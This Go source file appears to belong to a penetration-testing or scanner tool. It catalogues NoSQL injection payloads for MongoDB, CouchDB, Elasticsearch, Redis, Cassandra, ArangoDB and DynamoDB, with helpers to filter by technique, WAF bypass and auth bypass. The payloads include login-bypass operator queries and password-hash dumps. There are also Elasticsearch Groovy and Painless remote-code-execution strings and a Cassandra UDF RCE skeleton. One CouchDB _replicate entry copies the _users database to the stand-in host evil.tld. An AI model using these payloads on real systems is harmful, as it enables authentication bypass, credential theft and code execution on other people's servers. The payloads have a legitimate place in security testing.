// Package nosql provides NoSQL injection payloads for various database systems.
// Payloads are categorized by:
//   - Database type (MongoDB, CouchDB, Elasticsearch, Redis)
//   - Injection technique (Operator, JavaScript, JSON, Blind, Time-based)
//   - Context (Query, Auth bypass)
package nosql

// DBType represents a NoSQL database type.
type DBType string

const (
	MongoDB       DBType = "mongodb"
	CouchDB       DBType = "couchdb"
	Elasticsearch DBType = "elasticsearch"
	Redis         DBType = "redis"
	Cassandra     DBType = "cassandra"
	ArangoDB      DBType = "arangodb"
	DynamoDB      DBType = "dynamodb"
	Generic       DBType = "generic"
)

// Technique represents an injection technique.
type Technique string

const (
	TechOperator   Technique = "operator"
	TechJavaScript Technique = "javascript"
	TechJSON       Technique = "json"
	TechBlind      Technique = "blind"
	TechTimeBased  Technique = "time"
)

// Payload represents a NoSQL injection payload.
type Payload struct {
	Value       string
	Technique   Technique
	DBType      DBType
	Description string
	WAFBypass   bool // Payload includes WAF evasion
}

// GetPayloads returns payloads for a specific database type.
func GetPayloads(dbType DBType) []Payload {
	switch dbType {
	case MongoDB:
		return mongoDBPayloads
	case CouchDB:
		return couchDBPayloads
	case Elasticsearch:
		return elasticsearchPayloads
	case Redis:
		return redisPayloads
	case Cassandra:
		return cassandraPayloads
	case ArangoDB:
		return arangoDBPayloads
	case DynamoDB:
		return dynamoDBPayloads
	default:
		return genericPayloads
	}
}

// GetByTechnique returns payloads filtered by technique.
func GetByTechnique(dbType DBType, technique Technique) []Payload {
	all := GetPayloads(dbType)
	var result []Payload
	for _, p := range all {
		if p.Technique == technique {
			result = append(result, p)
		}
	}
	return result
}

// GetWAFBypassPayloads returns payloads designed for WAF evasion.
func GetWAFBypassPayloads(dbType DBType) []Payload {
	all := GetPayloads(dbType)
	var result []Payload
	for _, p := range all {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetAuthBypassPayloads returns authentication bypass payloads.
func GetAuthBypassPayloads() []Payload {
	return authBypassPayloads
}

// GetAllPayloads returns all payloads for all database types.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, genericPayloads...)
	all = append(all, mongoDBPayloads...)
	all = append(all, couchDBPayloads...)
	all = append(all, elasticsearchPayloads...)
	all = append(all, redisPayloads...)
	all = append(all, cassandraPayloads...)
	all = append(all, arangoDBPayloads...)
	all = append(all, dynamoDBPayloads...)
	all = append(all, mongoDBAdvancedPayloads...)
	all = append(all, couchDBAdvancedPayloads...)
	all = append(all, elasticsearchAdvancedPayloads...)
	return all
}

// GetOperatorPayloads returns all operator-based injection payloads.
func GetOperatorPayloads() []Payload {
	var result []Payload
	for _, p := range GetAllPayloads() {
		if p.Technique == TechOperator {
			result = append(result, p)
		}
	}
	return result
}

// GetJSONStructurePayloads returns all JSON structure manipulation payloads.
func GetJSONStructurePayloads() []Payload {
	var result []Payload
	for _, p := range GetAllPayloads() {
		if p.Technique == TechJSON {
			result = append(result, p)
		}
	}
	return result
}

// DeduplicatePayloads removes duplicate payloads based on Value and DBType.
func DeduplicatePayloads(payloads []Payload) []Payload {
	seen := make(map[string]bool)
	var result []Payload
	for _, p := range payloads {
		key := p.Value + "|" + string(p.DBType)
		if !seen[key] {
			seen[key] = true
			result = append(result, p)
		}
	}
	return result
}

// Generic NoSQL payloads that work across multiple databases.
// Source: PayloadsAllTheThings, HackTricks
var genericPayloads = []Payload{
	// JSON structure manipulation
	{Value: `{"$gt": ""}`, Technique: TechJSON, DBType: Generic, Description: "Generic greater than empty"},
	{Value: `{"$ne": ""}`, Technique: TechJSON, DBType: Generic, Description: "Generic not equal empty"},
	{Value: `{"$ne": null}`, Technique: TechJSON, DBType: Generic, Description: "Generic not equal null"},
	{Value: `{"$exists": true}`, Technique: TechJSON, DBType: Generic, Description: "Generic exists true"},
	{Value: `{"$regex": ".*"}`, Technique: TechJSON, DBType: Generic, Description: "Generic regex match all"},
}

// MongoDB-specific payloads.
// Source: PayloadsAllTheThings, HackTricks
var mongoDBPayloads = []Payload{
	// Operator injection
	{Value: `{"$gt": ""}`, Technique: TechOperator, DBType: MongoDB, Description: "Greater than empty string"},
	{Value: `{"$ne": ""}`, Technique: TechOperator, DBType: MongoDB, Description: "Not equal to empty string"},
	{Value: `{"$ne": null}`, Technique: TechOperator, DBType: MongoDB, Description: "Not equal to null"},
	{Value: `{"$gte": ""}`, Technique: TechOperator, DBType: MongoDB, Description: "Greater than or equal"},
	{Value: `{"$lt": "z"}`, Technique: TechOperator, DBType: MongoDB, Description: "Less than z"},
	{Value: `{"$regex": ".*"}`, Technique: TechOperator, DBType: MongoDB, Description: "Regex match all"},
	{Value: `{"$regex": "^a"}`, Technique: TechOperator, DBType: MongoDB, Description: "Regex starts with a"},
	{Value: `{"$in": ["admin", "root"]}`, Technique: TechOperator, DBType: MongoDB, Description: "In array"},
	{Value: `{"$nin": [""]}`, Technique: TechOperator, DBType: MongoDB, Description: "Not in array"},
	{Value: `{"$exists": true}`, Technique: TechOperator, DBType: MongoDB, Description: "Field exists"},
	{Value: `{"$type": 2}`, Technique: TechOperator, DBType: MongoDB, Description: "Type is string"},

	// JavaScript injection ($where)
	{Value: `{"$where": "1==1"}`, Technique: TechJavaScript, DBType: MongoDB, Description: "$where always true"},
	{Value: `{"$where": "this.password.match(/.*/)"}`, Technique: TechJavaScript, DBType: MongoDB, Description: "$where password regex"},
	{Value: `{"$where": "function() { return true; }"}`, Technique: TechJavaScript, DBType: MongoDB, Description: "$where function true"},
	{Value: `{"$where": "this.username == 'admin'"}`, Technique: TechJavaScript, DBType: MongoDB, Description: "$where username check"},
	{Value: `"'; return true; var x='"}`, Technique: TechJavaScript, DBType: MongoDB, Description: "JS string escape"},
	{Value: `'; return 1==1; var x='`, Technique: TechJavaScript, DBType: MongoDB, Description: "Return true injection"},

	// Blind/Time-based
	{Value: `{"$where": "sleep(5000)"}`, Technique: TechTimeBased, DBType: MongoDB, Description: "Sleep 5 seconds"},
	{Value: `{"$where": "function() { sleep(5000); return true; }"}`, Technique: TechTimeBased, DBType: MongoDB, Description: "Function sleep"},

	// WAF bypass
	{Value: `{"$gt": {"$gt": ""}}`, Technique: TechOperator, DBType: MongoDB, Description: "Nested operator bypass", WAFBypass: true},
	{Value: `{"\u0024gt": ""}`, Technique: TechOperator, DBType: MongoDB, Description: "Unicode escape operator", WAFBypass: true},
	{Value: `{"$where": "th\u0069s.password"}`, Technique: TechJavaScript, DBType: MongoDB, Description: "Unicode in JS", WAFBypass: true},

	// JSON structure manipulation
	{Value: `username[$ne]=admin&password[$ne]=admin`, Technique: TechJSON, DBType: MongoDB, Description: "Query string operator"},
	{Value: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`, Technique: TechJSON, DBType: MongoDB, Description: "JSON auth bypass"},
}

// CouchDB-specific payloads.
// Source: PayloadsAllTheThings, HackTricks
var couchDBPayloads = []Payload{
	// Mango query injection
	{Value: `{"selector": {"_id": {"$gt": null}}}`, Technique: TechJSON, DBType: CouchDB, Description: "Mango query all docs"},
	{Value: `{"selector": {"password": {"$regex": ".*"}}}`, Technique: TechJSON, DBType: CouchDB, Description: "Mango regex password"},
	{Value: `{"selector": {"username": {"$eq": "admin"}}}`, Technique: TechJSON, DBType: CouchDB, Description: "Mango exact match"},
	{Value: `{"selector": {"$or": [{"username": "admin"}, {"username": "root"}]}}`, Technique: TechJSON, DBType: CouchDB, Description: "Mango OR query"},

	// View injection
	{Value: `_all_docs`, Technique: TechOperator, DBType: CouchDB, Description: "List all documents"},
	{Value: `_design/`, Technique: TechOperator, DBType: CouchDB, Description: "Design document access"},
	{Value: `_users/_all_docs`, Technique: TechOperator, DBType: CouchDB, Description: "List all users"},

	// Operator injection
	{Value: `{"$ne": ""}`, Technique: TechOperator, DBType: CouchDB, Description: "Not equal operator"},
}

// Elasticsearch-specific payloads.
// Source: PayloadsAllTheThings
var elasticsearchPayloads = []Payload{
	// Query DSL injection
	{Value: `{"query": {"match_all": {}}}`, Technique: TechJSON, DBType: Elasticsearch, Description: "Match all query"},
	{Value: `{"query": {"wildcard": {"password": "*"}}}`, Technique: TechJSON, DBType: Elasticsearch, Description: "Wildcard password"},
	{Value: `{"query": {"regexp": {"username": ".*"}}}`, Technique: TechJSON, DBType: Elasticsearch, Description: "Regex username"},
	{Value: `{"query": {"bool": {"must_not": [{"match": {"username": ""}}]}}}`, Technique: TechJSON, DBType: Elasticsearch, Description: "Bool must_not query"},

	// Script injection
	{Value: `{"script": {"source": "ctx._source.password"}}`, Technique: TechJavaScript, DBType: Elasticsearch, Description: "Script source injection"},
	{Value: `{"script_fields": {"test": {"script": "_source.password"}}}`, Technique: TechJavaScript, DBType: Elasticsearch, Description: "Script fields injection"},

	// Operator injection
	{Value: `*:*`, Technique: TechOperator, DBType: Elasticsearch, Description: "Lucene match all"},
	{Value: `password:*`, Technique: TechOperator, DBType: Elasticsearch, Description: "Lucene field wildcard"},

	// Time-based (heavy computation)
	{Value: `{"script": {"source": "for(int i=0;i<1000000;i++){}"}}`, Technique: TechTimeBased, DBType: Elasticsearch, Description: "Script delay loop"},
}

// Redis-specific payloads.
// Source: HackTricks
var redisPayloads = []Payload{
	// Command injection
	{Value: `*\r\nINFO\r\n`, Technique: TechOperator, DBType: Redis, Description: "INFO command injection"},
	{Value: `*\r\nKEYS *\r\n`, Technique: TechOperator, DBType: Redis, Description: "KEYS command injection"},
	{Value: `*\r\nCONFIG GET *\r\n`, Technique: TechOperator, DBType: Redis, Description: "CONFIG GET injection"},
	{Value: `*\r\nDEBUG SLEEP 5\r\n`, Technique: TechTimeBased, DBType: Redis, Description: "DEBUG SLEEP injection"},

	// Lua script injection
	{Value: `EVAL "return redis.call('INFO')" 0`, Technique: TechJavaScript, DBType: Redis, Description: "Lua script INFO"},
	{Value: `EVAL "return redis.call('KEYS', '*')" 0`, Technique: TechJavaScript, DBType: Redis, Description: "Lua script KEYS"},
}

// Authentication bypass payloads.
// Source: PayloadsAllTheThings, HackTricks
var authBypassPayloads = []Payload{
	// MongoDB auth bypass
	{Value: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`, Technique: TechJSON, DBType: MongoDB, Description: "Auth bypass ne"},
	{Value: `{"username": {"$gt": ""}, "password": {"$gt": ""}}`, Technique: TechJSON, DBType: MongoDB, Description: "Auth bypass gt"},
	{Value: `{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}`, Technique: TechJSON, DBType: MongoDB, Description: "Auth bypass regex"},
	{Value: `username[$ne]=&password[$ne]=`, Technique: TechJSON, DBType: MongoDB, Description: "Query string auth bypass"},
	{Value: `{"username": "admin", "password": {"$ne": ""}}`, Technique: TechJSON, DBType: MongoDB, Description: "Admin password bypass"},
	{Value: `{"$or": [{"username": "admin"}, {"username": "administrator"}]}`, Technique: TechJSON, DBType: MongoDB, Description: "OR admin bypass"},

	// CouchDB auth bypass
	{Value: `{"selector": {"type": "user", "password": {"$gt": null}}}`, Technique: TechJSON, DBType: CouchDB, Description: "CouchDB auth bypass"},

	// Generic
	{Value: `{"$where": "1==1"}`, Technique: TechJavaScript, DBType: Generic, Description: "Generic JS auth bypass"},
}

// --- HackTricks / PayloadAllTheThings knowledge expansion ---

// Cassandra CQL injection. The CQL parser tolerates ALLOW FILTERING
// and inline comments; UDF (User Defined Function) injection lets
// authenticated attackers reach a sandboxed JVM.
var cassandraPayloads = []Payload{
	{Value: `' OR '1'='1`, Technique: TechBlind, DBType: Cassandra, Description: "CQL OR tautology"},
	{Value: `' OR 1=1 ALLOW FILTERING--`, Technique: TechBlind, DBType: Cassandra, Description: "ALLOW FILTERING tautology"},
	{Value: `' OR TOKEN(id) > 0 ALLOW FILTERING--`, Technique: TechBlind, DBType: Cassandra, Description: "TOKEN() partition scan"},
	{Value: `'; SELECT * FROM system_schema.tables--`, Technique: TechOperator, DBType: Cassandra, Description: "Schema enumeration"},
	{Value: `'; SELECT role,salted_hash FROM system_auth.roles--`, Technique: TechOperator, DBType: Cassandra, Description: "Hash dump via system_auth.roles"},
	{Value: `'; CREATE FUNCTION rce(x text) RETURNS NULL ON NULL INPUT RETURNS text LANGUAGE java AS '...';`, Technique: TechJavaScript, DBType: Cassandra, Description: "UDF RCE skeleton (JVM)"},
}

// ArangoDB AQL injection. AQL is a SQL-like dialect; LET + FOR loops
// let an attacker enumerate any collection. RETURN_USER() (AQL UDF
// surface) and the @@request bind-parameter bypass round it out.
var arangoDBPayloads = []Payload{
	{Value: `") OR (1==1) RETURN d //`, Technique: TechBlind, DBType: ArangoDB, Description: "AQL boolean tautology"},
	{Value: `"); RETURN _users //`, Technique: TechOperator, DBType: ArangoDB, Description: "RETURN _users system collection"},
	{Value: `"); FOR u IN _users RETURN u //`, Technique: TechOperator, DBType: ArangoDB, Description: "Iterate _users"},
	{Value: `"); FOR d IN _system_db RETURN d //`, Technique: TechOperator, DBType: ArangoDB, Description: "_system_db dump"},
	{Value: `"); LET pwd = (FOR u IN _users RETURN u.authData.simple.hash) RETURN pwd //`, Technique: TechOperator, DBType: ArangoDB, Description: "Extract hashed passwords"},
}

// DynamoDB PartiQL injection — UNION-equivalent via OR + comparison.
// PartiQL is the SQL-compatible front for DynamoDB; misuse occurs
// when apps concat user input into ExecuteStatement.
var dynamoDBPayloads = []Payload{
	{Value: `' OR username IS NOT MISSING--`, Technique: TechBlind, DBType: DynamoDB, Description: "PartiQL not-missing tautology"},
	{Value: `' OR begins_with(username,'a')--`, Technique: TechBlind, DBType: DynamoDB, Description: "PartiQL begins_with blind enum"},
	{Value: `' OR attribute_exists(secret)--`, Technique: TechBlind, DBType: DynamoDB, Description: "PartiQL attribute_exists fingerprint"},
	{Value: `'; SELECT * FROM "users"--`, Technique: TechOperator, DBType: DynamoDB, Description: "Stacked SELECT (multi-statement)"},
}

// MongoDB advanced — adds blind boolean exfil via $regex letter-by-
// letter, the $function operator (4.4+) for server-side JS, error-
// based via $jsonSchema mismatch, and BSON-type confusion.
var mongoDBAdvancedPayloads = []Payload{
	{Value: `{"username":"admin","password":{"$regex":"^a"}}`, Technique: TechBlind, DBType: MongoDB, Description: "$regex letter-by-letter blind exfil"},
	{Value: `{"username":"admin","password":{"$regex":"^.{8,}$"}}`, Technique: TechBlind, DBType: MongoDB, Description: "$regex length fingerprint"},
	{Value: `{"$function":{"body":"function(){sleep(5000);return true;}","args":[],"lang":"js"}}`, Technique: TechTimeBased, DBType: MongoDB, Description: "MongoDB 4.4+ $function sleep"},
	{Value: `{"$function":{"body":"function(){return db.users.find().toArray()}","args":[],"lang":"js"}}`, Technique: TechJavaScript, DBType: MongoDB, Description: "MongoDB 4.4+ $function arbitrary read"},
	{Value: `{"$expr":{"$gt":[{"$strLenCP":"$password"},10]}}`, Technique: TechBlind, DBType: MongoDB, Description: "$expr password-length blind"},
	{Value: `{"username":{"$gt":"%00"}}`, Technique: TechOperator, DBType: MongoDB, Description: "Null-byte-floor $gt enumeration"},
	{Value: `{"$jsonSchema":{"properties":{"x":{"type":"number"}}}}`, Technique: TechBlind, DBType: MongoDB, Description: "$jsonSchema validator error leak"},
}

// CouchDB advanced — admin party detection, _replicate misuse,
// _changes feed exfil, _session cookie forge.
var couchDBAdvancedPayloads = []Payload{
	{Value: `_session`, Technique: TechOperator, DBType: CouchDB, Description: "CouchDB session endpoint"},
	{Value: `_changes?feed=continuous`, Technique: TechOperator, DBType: CouchDB, Description: "_changes continuous feed (real-time exfil)"},
	{Value: `_replicate {"source":"http://target/_users","target":"http://evil.tld/exfil"}`, Technique: TechOperator, DBType: CouchDB, Description: "_replicate _users to attacker"},
	{Value: `_active_tasks`, Technique: TechOperator, DBType: CouchDB, Description: "Active tasks (info leak)"},
	{Value: `_config`, Technique: TechOperator, DBType: CouchDB, Description: "Config endpoint (admin-party fingerprint)"},
	{Value: `{"selector":{"$and":[{"_id":{"$gt":null}},{"type":{"$ne":""}}]}}`, Technique: TechJSON, DBType: CouchDB, Description: "Mango $and compound query"},
	{Value: `{"selector":{"_id":{"$not":{"$exists":false}}}}`, Technique: TechJSON, DBType: CouchDB, Description: "Mango double-negation existence"},
}

// Elasticsearch Painless RCE — Painless is sandboxed but historically
// has had escapes (CVE-2014-3120, CVE-2015-1427). Detection markers
// for both the script context and the sandbox-escape primitives.
var elasticsearchAdvancedPayloads = []Payload{
	{Value: `{"script":{"source":"java.lang.Runtime.getRuntime().exec('id')","lang":"groovy"}}`, Technique: TechJavaScript, DBType: Elasticsearch, Description: "Legacy Groovy RCE (CVE-2015-1427)"},
	{Value: `{"script":{"source":"Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"}}`, Technique: TechJavaScript, DBType: Elasticsearch, Description: "Painless reflection chain"},
	{Value: `{"script":{"source":"new ProcessBuilder([\"id\"]).start().getInputStream().text"}}`, Technique: TechJavaScript, DBType: Elasticsearch, Description: "Painless ProcessBuilder (older versions)"},
	{Value: `{"query":{"match_all":{}},"_source":false,"script_fields":{"pwd":{"script":{"source":"java.lang.System.getenv()"}}}}`, Technique: TechJavaScript, DBType: Elasticsearch, Description: "Env-var leak via script_fields"},
	{Value: `/_msearch`, Technique: TechOperator, DBType: Elasticsearch, Description: "Multi-search endpoint (cross-index probe)"},
	{Value: `/_search?q=*`, Technique: TechOperator, DBType: Elasticsearch, Description: "Wildcard q= search (no auth check)"},
	{Value: `/_cat/indices?v`, Technique: TechOperator, DBType: Elasticsearch, Description: "Index enumeration via _cat"},
	{Value: `/_cluster/state`, Technique: TechOperator, DBType: Elasticsearch, Description: "Cluster state (every node, every index)"},
}
